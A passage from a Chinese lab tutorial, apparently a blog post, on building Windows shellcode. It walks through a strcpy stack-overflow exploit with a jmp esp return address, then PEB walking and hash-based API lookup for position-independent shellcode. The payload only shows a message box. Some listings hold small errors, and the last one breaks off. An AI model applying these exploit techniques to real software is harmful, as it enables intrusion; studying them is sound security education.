<h3 id="调用ExitProcess-0-的汇编代码："><a href="#调用ExitProcess-0-的汇编代码：" class="headerlink" title="调用ExitProcess(0)的汇编代码："></a>调用ExitProcess(0)的汇编代码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">xor ebx,ebx  // 将ebx清零</div><div class="line">push ebx     // ExitProcess有一个参数，参数为0</div><div class="line">mov eax,0x7c81bfa2</div><div class="line">call eax</div></pre></td></tr></table></figure>
<h3 id="调用MessageBox-的汇编代码："><a href="#调用MessageBox-的汇编代码：" class="headerlink" title="调用MessageBox()的汇编代码："></a>调用MessageBox()的汇编代码：</h3><p>比如我想弹出的信息框，标题是<code>Warning</code>，内容是<code>hacked by Cytosine.</code></p>
<p>那么我们就需要把字符串转换为十六进制的ASCII码，从右至左每四个字符一组，然后入栈</p>
<ol>
<li><p>字符串转换为十六进制的ASCII码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; &apos;Warning&apos;.encode(&apos;hex&apos;)</div><div class="line">&apos;5761726e696e67&apos;</div><div class="line">&gt;&gt;&gt; &apos;hacked by Cytosine.&apos;.encode(&apos;hex&apos;)</div><div class="line">&apos;6861636b6564206279204379746f73696e652e&apos;</div></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>分组：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Warning</div><div class="line">5761726e</div><div class="line">696e67</div><div class="line"></div><div class="line">hacked by Cytosine.</div><div class="line">6861636b</div><div class="line">65642062</div><div class="line">79204379</div><div class="line">746f7369</div><div class="line">6e652e</div></pre></td></tr></table></figure>
</li>
</ol>
<pre><code>填充`20`：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Warning</div><div class="line">5761726e</div><div class="line">696e6720</div><div class="line"></div><div class="line">hacked by Cytosine.</div><div class="line">6861636b</div><div class="line">65642062</div><div class="line">79204379</div><div class="line">746f7369</div><div class="line">6e652e20</div></pre></td></tr></table></figure>


**为什么用`20`填充而不是用`00`填充？**

因为`strcpy`遇到`\x00`就会停止拷贝。
</code></pre><ol>
<li><p>入栈:</p>
<p> （一个倒序的py2小脚本）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">   s=&quot;&quot;&quot;</div><div class="line">   5761726e</div><div class="line">696e6720</div><div class="line">6861636b</div><div class="line">65642062</div><div class="line">79204379</div><div class="line">746f7369</div><div class="line">6e652e20</div><div class="line">   &quot;&quot;&quot;</div><div class="line">   s_list = s.split()</div><div class="line">   print s_list</div><div class="line"></div><div class="line">   rst_list = []</div><div class="line">   for iterm in s_list:</div><div class="line">       rst = [iterm[idx:idx+2] for idx in range(0,len(iterm),2)]</div><div class="line">       rst.reverse()</div><div class="line">       rst_list.append(&apos;&apos;.join(rst))</div><div class="line">   print rst_list</div><div class="line">   for i in rst_list:</div><div class="line">       print &quot;push 0x%s&quot;%i</div></pre></td></tr></table></figure>
<p> 参数入栈汇编代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">xor ebx,ebx</div><div class="line">push ebx         // &quot;Warning&quot;字符串后面的00，表示字符串结尾</div><div class="line">push 0x20676e69</div><div class="line">push 0x6e726157  // &quot;Warning&quot;倒序入栈</div><div class="line">mov eax,esp      //当前栈指针寄存器的值给eax，也就是保存字符串&quot;Warning&quot;的起始地址</div><div class="line"></div><div class="line">push ebx         // &quot;hacked by Cytosine.&quot;字符串后面的00</div><div class="line">push 0x202e656e</div><div class="line">push 0x69736f74</div><div class="line">push 0x79432079</div><div class="line">push 0x62206465</div><div class="line">push 0x6b636168  // &quot;hacked by Cytosine.&quot;倒序入栈</div><div class="line">mov ecx,esp      //保存字符串&quot;hacked by Cytosine.&quot;的起始地址</div><div class="line"></div><div class="line">push ebx   // 00</div><div class="line">push eax   // &quot;Warning&quot;的起始地址</div><div class="line">push ecx   // &quot;hacked by Cytosine.&quot;的起始地址</div><div class="line">push ebx</div><div class="line">mov eax,0x77d507ea</div><div class="line">call eax</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="将汇编代码改写为shellcode，植入缓冲区"><a href="#将汇编代码改写为shellcode，植入缓冲区" class="headerlink" title="将汇编代码改写为shellcode，植入缓冲区"></a>将汇编代码改写为shellcode，植入缓冲区</h2><p>complete asm code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	_asm&#123;</div><div class="line">		sub esp,0x50    //抬高栈针，避免后面的push指令把本身的指令给覆盖掉</div><div class="line">		</div><div class="line">		xor ebx,ebx</div><div class="line">		push ebx         // &quot;Warning&quot;字符串后面的00，表示字符串结尾</div><div class="line">		push 0x20676e69</div><div class="line">		push 0x6e726157  // &quot;Warning&quot;倒序入栈</div><div class="line">		mov eax,esp      //当前栈指针寄存器的值给eax，也就是保存字符串&quot;Warning&quot;的起始地址</div><div class="line">		</div><div class="line">		push ebx         // &quot;hacked by Cytosine.&quot;字符串后面的00</div><div class="line">		push 0x202e656e</div><div class="line">		push 0x69736f74</div><div class="line">		push 0x79432079</div><div class="line">		push 0x62206465</div><div class="line">		push 0x6b636168  // &quot;hacked by Cytosine.&quot;倒序入栈</div><div class="line">		mov ecx,esp      //保存字符串&quot;hacked by Cytosine.&quot;的起始地址</div><div class="line">		</div><div class="line">		</div><div class="line">		// call MessageBox()</div><div class="line">		push ebx   // 00</div><div class="line">		push eax   // &quot;Warning&quot;的起始地址</div><div class="line">		push ecx   // &quot;hacked by Cytosine.&quot;的起始地址</div><div class="line">		push ebx</div><div class="line">		mov eax,0x77d507ea</div><div class="line">		call eax     </div><div class="line">		</div><div class="line">		//call ExitProcess()</div><div class="line">		push ebx     // ExitProcess有一个参数，参数为0</div><div class="line">		mov eax,0x7c81bfa2</div><div class="line">		call eax</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Insert breakpoint at <code>_asm</code>, then press F5</p>
<p><img src="15.png" alt=""></p>
<p>click Disassembly button, and 工具菜单 -&gt; 选项 -&gt; 调试 -&gt; 勾选代码字节</p>
<p><img src="16.png" alt=""></p>
<p><img src="17.png" alt=""></p>
<p><img src="18.png" alt=""></p>
<p>now:</p>
<p><img src="19.png" alt=""></p>
<p>从箭头所指左大括号下，到<code>_asm</code>右大括号下，就是我们需要的shellcode</p>
<p>提取出来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">\x83\xEC\x50			sub esp,50h</div><div class="line">\x33\xDB				xor ebx,ebx</div><div class="line">\x53					push ebx</div><div class="line">\x68\x69\x6E\x67\x20	push 20676E69h</div><div class="line">\x68\x57\x61\x72\x6E	push 6E726157h  //push &quot;Warning&quot;</div><div class="line">\x8B\xC4				mov eax,esp</div><div class="line">\x53					push ebx</div><div class="line">\x68\x6E\x65\x2E\x20	push h</div><div class="line">\x68\x74\x6f\x73\x69	push h</div><div class="line">\x68\x79\x20\x43\x79	push h</div><div class="line">\x68\x65\x64\x20\x62	push h</div><div class="line">\x68\x68\x61\x63\x6B	push h    // push &quot;hacked by Cytosine.&quot;</div><div class="line">\x8B\xCC				mov ecx,esp</div><div class="line">\x53					push ebx</div><div class="line">\x50					push eax</div><div class="line">\x51					push ecx</div><div class="line">\x53					push ebx</div><div class="line">\xB8\xEA\x07\xD5\x77	mov eax,77D507EAh</div><div class="line">\xFF\xD0				call eax  // call MessageBox</div><div class="line">\x53					push ebx</div><div class="line">\xB8\xA2\xBF\x81\x7C	mov eax,7C81BFA2h</div><div class="line">\xFF\xD0				call eax  // call ExitProcess</div></pre></td></tr></table></figure>
<p>完整的利用代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;string.h&quot;</div><div class="line"></div><div class="line">char name[]=&quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot; // name[0]~name[7]</div><div class="line">			&quot;\x41\x41\x41\x41&quot;   	// EBP</div><div class="line">			&quot;\x79\x5b\xe3\x77&quot;   	// Return Address</div><div class="line">			&quot;\x83\xEC\x50&quot; 			// sub esp,0x50</div><div class="line">			&quot;\x33\xDB&quot;				// xor ebx,ebx</div><div class="line">			&quot;\x53&quot;					// push ebx</div><div class="line">			&quot;\x68\x69\x6E\x67\x20&quot;	</div><div class="line">			&quot;\x68\x57\x61\x72\x6E&quot; // push &quot;Warning&quot;</div><div class="line">			&quot;\x8B\xC4&quot;				// mov eax,esp</div><div class="line">			&quot;\x53&quot;					// push ebx</div><div class="line">			&quot;\x68\x6E\x65\x2E\x20&quot; </div><div class="line">			&quot;\x68\x74\x6f\x73\x69&quot;</div><div class="line">			&quot;\x68\x79\x20\x43\x79&quot;</div><div class="line">			&quot;\x68\x65\x64\x20\x62&quot;</div><div class="line">			&quot;\x68\x68\x61\x63\x6B&quot; // push &quot;hacked by Cytosine.&quot;</div><div class="line">			&quot;\x8B\xCC&quot;				// mov ecx,esp</div><div class="line">			&quot;\x53&quot;					// push ebx</div><div class="line">			&quot;\x50&quot;					// push eax</div><div class="line">			&quot;\x51&quot;					// push ecx</div><div class="line">			&quot;\x53&quot;					// push ebx</div><div class="line">			&quot;\xB8\xEA\x07\xD5\x77&quot; // mov eax,77D507EAh</div><div class="line">			&quot;\xFF\xD0&quot;				// call eax  // call MessageBox</div><div class="line">			&quot;\x53&quot;					// push ebx</div><div class="line">			&quot;\xB8\xA2\xBF\x81\x7C&quot; // mov eax,7C81BFA2h</div><div class="line">			&quot;\xFF\xD0&quot;;				// call eax  // call ExitProcess</div><div class="line"></div><div class="line">int main()&#123;</div><div class="line">	char buffer[8];</div><div class="line">	LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">	strcpy(buffer, name);</div><div class="line">	printf(&quot;%s\n&quot;, buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译运行:</p>
<p><img src="20.png" alt=""></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>main函数返回前：</p>
<p><img src="21.png" alt=""></p>
<p>成功跳到jmp esp</p>
<p><img src="22.png" alt=""></p>
<p>以esp为跳板，成功跳到窝们自己编写的shellcode</p>
<h1 id="编写通用shellcode"><a href="#编写通用shellcode" class="headerlink" title="编写通用shellcode"></a>编写通用shellcode</h1><h2 id="利用hash程序计算函数名称的摘要"><a href="#利用hash程序计算函数名称的摘要" class="headerlink" title="利用hash程序计算函数名称的摘要"></a>利用hash程序计算函数名称的摘要</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">MessageBoxA 位于 user32.dll   // 要先LoadLibrary(user32.dll)</div><div class="line">LoadLibraryA 位于 kernel32.dll  // 所有win32程序都会自动加载ntdll.dll和kernel32.dll</div><div class="line">ExitProcess 位于 kernel32.dll</div></pre></td></tr></table></figure>
<p>计算函数名称的hash摘要，是为了缩短shellcode的长度</p>
<p>计算函数名hash摘要的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">#include &lt;windows.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">DWORD GetHash(char *fun_name)</div><div class="line">&#123;</div><div class="line">	 DWORD digest = 0;</div><div class="line">	 while(*fun_name)</div><div class="line">	 &#123;</div><div class="line">		  digest = ((digest &lt;&lt; 25) | (digest &gt;&gt; 7 ));</div><div class="line">		  digest += *fun_name;</div><div class="line">		  fun_name++;</div><div class="line">	 &#125;</div><div class="line">	 return digest;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	 DWORD hash;</div><div class="line">	 </div><div class="line">	 hash = GetHash(&quot;MessageBoxA&quot;);</div><div class="line">	 printf(&quot;The hash of MessageBoxA is 0x%.8x\n&quot;, hash);</div><div class="line">	 </div><div class="line">	 hash = GetHash(&quot;ExitProcess&quot;);</div><div class="line">	 printf(&quot;The hash of ExitProcess is 0x%.8x\n&quot;, hash);</div><div class="line">	 </div><div class="line">	 hash = GetHash(&quot;LoadLibraryA&quot;);</div><div class="line">	 printf(&quot;The hash of LoadLibraryA is 0x%.8x\n&quot;, hash);</div><div class="line">	 </div><div class="line">	 getchar();</div><div class="line">	 return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>result:</p>
<p><img src="24.png" alt=""></p>
<p>通过hash摘要，将任意长度的函数名变成四个字节（DWORD)。</p>
<p>让函数hash入栈的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push 0x1e380a6a    // MessageBoxA的hash值</div><div class="line">push 0x4fd18963    // ExitProcess的hash值</div><div class="line">push 0x0c917432    // LoadLibraryA的hash值</div><div class="line">mov esi,esp        // esi保存的是栈顶第一个函数，即LoadLibraryA的hash值</div></pre></td></tr></table></figure>
<p>用于计算hash值的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">hash_loop:</div><div class="line">	movsx eax,byte ptr[esi]  // 每次取出一个字符放入eax中</div><div class="line">	cmp  al,ah            	 // 验证eax是否为0x0，即结束符</div><div class="line">	jz  compare_hash    	 // 如果上述结果为零，说明hash值计算完毕，则进行hash值的比较</div><div class="line">	ror     edx,7            // 如果cmp的结果不为零，则进行循环右移7位的操作</div><div class="line">	add  edx,eax             // 将循环右移的值不断累加</div><div class="line">	inc  esi                 // esi自增，用于读取下一个字符</div><div class="line">	jmp  hash_loop           // 跳到hash_loop的位置继续计算</div></pre></td></tr></table></figure>
<h2 id="动态获取kernel32-dll在系统中的基址"><a href="#动态获取kernel32-dll在系统中的基址" class="headerlink" title="动态获取kernel32.dll在系统中的基址"></a>动态获取kernel32.dll在系统中的基址</h2><h3 id="WinDbg简单演示"><a href="#WinDbg简单演示" class="headerlink" title="WinDbg简单演示"></a>WinDbg简单演示</h3><p>文件 -&gt; 内核调试：</p>
<p><img src="25.png" alt=""></p>
<p>本地调试 -&gt; 确定</p>
<p><img src="26.png" alt=""></p>
<p>界面如下：</p>
<p><img src="27.png" alt=""></p>
<ol>
<li><p>通过段选择字FS，在内存中找到当前的现成环境块TEB。线程环境块偏移位置为0x30的地方，存放着指向进程环境块的PEB的指针。</p>
<p> <code>!ted</code>:</p>
<p> <img src="28.png" alt=""></p>
</li>
<li><p>进程环境块中偏移位置为0x0c的地方存放着指向<code>PEB_LDR_DATA</code>结构体的指针，其中，存放着已经被进程装载的动态链接库的信息。</p>
<p> 由上一步的<code>PEB Address</code>可知PEB地址为<code>0x7ffde000</code></p>
<p> <code>dt _peb 7ffde000</code>: // dt display type 显示结构</p>
<p> <img src="29.png" alt="">    </p>
</li>
<li><p><code>PEB_LDR_DATA</code>结构体便宜位置为0x1c的地方，存放着指向模块初始化链表的头指针InInitializationOrderModuleList</p>
<p> <code>dt _PEB_LDR_DATA 0x00191e90</code>:</p>
<p> <img src="30.png" alt=""></p>
</li>
<li><p>模块初始化链表InInitializationOrderModuleList中，按顺序存放着PE装入运行时，初始化模块的信息，第一个链表节点是ntdll.dll，第二个链表节点就是kernel32.dll</p>
<p> <code>dd 0x191f28</code>: // display dword 以DWORD形式显示</p>
<p> <img src="31.png" alt=""></p>
<p> <code>0x191f28</code>保存的是第一个链节点的指针，连着的<code>00191fd0</code>是第二个节点</p>
<p> <code>dd 0x00191fd0</code>:</p>
<p> <img src="32.png" alt=""></p>
<p> 第二个节点偏移0x08个字节处是kernel32.dll，地址<code>0x7c800000</code>。</p>
<p> 验证：</p>
<p> <img src="33.png" alt=""></p>
</li>
</ol>
<h3 id="动态获取kernel32-dll地址的汇编代码"><a href="#动态获取kernel32-dll地址的汇编代码" class="headerlink" title="动态获取kernel32.dll地址的汇编代码"></a>动态获取kernel32.dll地址的汇编代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mov  ebx,fs:[edx+0x30] // [TEB+0x30]是PEB的位置</div><div class="line">mov  ecx,[ebx+0xC]     // [PEB+0xC]是PEB_LDR_DATA的位置</div><div class="line">mov  ecx,[ecx+0x1C]    // [PEB_LDR_DATA+0x1C]是InInitializationOrderModuleList的位置</div><div class="line">mov  ecx,[ecx]         // 进入链表第一个就是ntdll.dll</div><div class="line">mov  ebp,[ecx+0x8]     // ebp保存的是kernel32.dll的基地址</div></pre></td></tr></table></figure>
<h2 id="动态解析kernel32-dll的PE结构，获取导出表中的函数"><a href="#动态解析kernel32-dll的PE结构，获取导出表中的函数" class="headerlink" title="动态解析kernel32.dll的PE结构，获取导出表中的函数"></a>动态解析kernel32.dll的PE结构，获取导出表中的函数</h2><h3 id="理论分析"><a href="#理论分析" class="headerlink" title="理论分析"></a>理论分析</h3><blockquote>
<p>得到了kernel32.dll的地址，由于它也是属于PE文件，那么我们可以根据PE文件的结构特征，对其导出表进行解析，不断遍历搜索，从而找到我们所需要的API函数。<br>摘自实验指导手册</p>
</blockquote>
<ol>
<li><p>从kernel32.dll加载基址算起，偏移0x3c的地方就是PE头</p>
</li>
<li><p>PE头偏移0x78的地方存放着指向函数导出表的指针</p>
</li>
<li>导出表偏移0x1c处的指针，指向存储导出函数偏移地址(RVA)的列表</li>
<li>导出表偏移0x20出的指针，指向存储导出函数名的列表。</li>
<li>函数的RVA地址和名字按照顺序存放在上述两个列表中，窝们可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的RVA。</li>
<li>获得RVA后，再加上前边已经得到的dll的加载地址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是窝们最终在shellcode中调用时需要的地址。</li>
</ol>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">// ==== 在PE文件中查找相应的API函数 ====   </div><div class="line">find_functions:</div><div class="line">	  pushad                      // 保护所有寄存器中的内容</div><div class="line">	  mov  eax,[ebp+0x3C]  		// PE头</div><div class="line">	  mov  ecx,[ebp+eax+0x78]   // 导出表的指针</div><div class="line">	  add  ecx,ebp    </div><div class="line">	  mov  ebx,[ecx+0x20]  		// 导出函数的名字列表</div><div class="line">	  add  ebx,ebp             </div><div class="line">	  xor  edi,edi             // 清空edi中的内容，用作索引</div><div class="line">// ==== 循环读取导出表函数 ====   </div><div class="line">next_function_loop:</div><div class="line">	  inc  edi                 // edi不断自增，作为索引</div><div class="line">	  mov     esi,[ebx+edi*4]     // 从列表数组中读取</div><div class="line">	  add  esi,ebp       		// esi保存的是函数名称所在地址</div><div class="line">	  cdq                         // 把edx的每一位置成eax的最高位，再把edx扩展为eax的高位，即变为64位</div></pre></td></tr></table></figure>
<h2 id="得到通用的shellcode"><a href="#得到通用的shellcode" class="headerlink" title="得到通用的shellcode"></a>得到通用的shellcode</h2><p>asm code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div></pre></td><td class="code"><pre><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	 _asm</div><div class="line">	 &#123;</div><div class="line">	     // ==== 函数名hash入栈 ====</div><div class="line">	     cld			// 清空标志位DF</div><div class="line">	     push 0x1e380a6a    // MessageBoxA的hash值</div><div class="line">	     push 0x4fd18963    // ExitProcess的hash值</div><div class="line">	     push 0x0c917432    // LoadLibraryA的hash值</div><div class="line">	     mov esi,esp        // esi保存的是栈顶第一个函数，即LoadLibraryA的hash值</div><div class="line">	     lea edi,[esi-0xc]  // 后面要利用edi的值来调用不同的函数</div><div class="line">	     </div><div class="line">	     // ==== 开辟栈空间 ====</div><div class="line">	     xor ebx,ebx</div><div class="line">	     mov bh,0x04		// 此时ebx为0x400</div><div class="line">	     sub esp,ebx		// 开辟0x400大小的空间</div><div class="line">	     </div><div class="line">	     // ==== 压入user32.dll ====</div><div class="line">	     mov bx,0x3233</div><div class="line">	     push ebx			// 压入字符&quot;32&quot;</div><div class="line">	     push 0x72657375	// 压入字符&quot;user&quot;</div><div class="line">	     push esp</div><div class="line">	     xor edx,edx</div><div class="line">	     </div><div class="line">	     // ==== 查找kernel32.dll的基地址 ====</div><div class="line">	     mov ebx,fs:[edx+0x30]	// [TEB+0X30]是PEB的位置</div><div class="line">	     mov ecx,[ebx+0xC]		// [PEB+0xC]是PEB_LDR_DATA的位置</div><div class="line">	     mov ecx,[ecx+0x1C]		// [PEB_LDR_DATA+0x1C]是InInitializationOrderModuleList的位置</div><div class="line">	     mov ecx,[ecx]			// 进入链表第一个就是ntdll.dll</div><div class="line">	     mov ebp,[ecx+0x8]		// ebp保存kernel32.dll的基地址</div><div class="line">	     </div><div class="line">	     find_lib_function:</div><div class="line">	         lodsd</div><div class="line">	         cmp eax,0x1e380a6a	// 与MessageBoxA的hash值进行比较</div><div class="line">	         jne find_functions	// 如果不相等，继续查找</div><div class="line">	         xchg eax,ebp</div><div class="line">	         call [edi-0x8]</div><div class="line">	         xchg eax,ebp</div><div class="line">	         </div><div class="line">	     // ==== 在PE文件中查找API函数 ====</div><div class="line">	     find_functions:</div><div class="line">	         pushad					// 保护所有寄存器中的内容</div><div class="line">	         mov eax,[ebp+0x3C]		// PE头</div><div class="line">	         mov ecx,[ebp+eax+0x78]	// 导出表的指针</div><div class="line">	         add ecx,ebp</div><div class="line">	         mov ecx,[ecx+0x20]		// 导出函数的名字列表</div><div class="line">	         add ebx,ebp</div><div class="line">	         xor edi,edi			// 清空edi中的内容，用作索引</div><div class="line">	     </div><div class="line">	     // ==== 循环读取导出表函数 ====</div><div class="line">	     next_function_loop:</div><div class="line">	         inc edi				// edi不断自增，作为索引</div><div class="line">	         mov esi,[ebx+edi*4]	// 从列表数组中读取</div><div class="line">	         add esi,ebp			// esi保存的是函数名称所在地址</div><div class="line">	         cdq					// 把edx的每一位置成eax的最高位，再把edx扩展成eax的高位，即变成64位</div><div class="line">	     </div><div class="line">	     // ==== 计算hash =====</div><div class="line">	     hash_loop:</div><div class="line">	         movsx eax,byte ptr[esi]	// 每次取出一个字符放入eax中</div><div class="line">	         cmp al,ah					// 验证eax是否为0x0，即结束符</div><div class="line">	         jz  compare_hash			// 如果上述结果为零，说明hash值计算完毕，则进行hash值比较</div><div class="line">	         ror edx,7					// 如果cmp的结果不为零，则进行循环右移7位的操作</div><div class="line">	         add edx,eax				// 将循环右移的值不断累加</div><div class="line">	         inc esi					// esi自增，用于读取下一个字符</div><div class="line">	         jmp hash_loop				// 跳到hash_loop的位置继续计算</div><div class="line">	     </div><div class="line">	     // ===== hash值的比较 ====</div><div class="line">	     compare_hash:</div><div class="line">	         cmp edx,[esp+0x1C]			// 与LoadLiraryA的hash📒</div><div class="line">	         jnz next_function_loop		// 如果比较不成功，则继续寻找导出表的下一个函数</div><div class="line">	         mov ebx,[ecx+0x24]			</div><div class="line">	         add ebx,ebp				</div><div class="line">	         mov di,[ebx+2*edi]			</div><div class="line">	         mov ebx,[ecx+0x1C]			</div><div class="line">	         add ebx,ebp				</div><div class="line">	         add ebp,[ebx+4*edi]		</div><div class="line">	         xchg eax,ebp				</div><div class="line">	         pop  edi					</div><div class="line">	         stosd						</div><div class="line">	         push edi					</div><div class="line">	         popad						// 还原所有寄存器的内容</div><div class="line">	         cmp  eax,0x1e380a6a		// 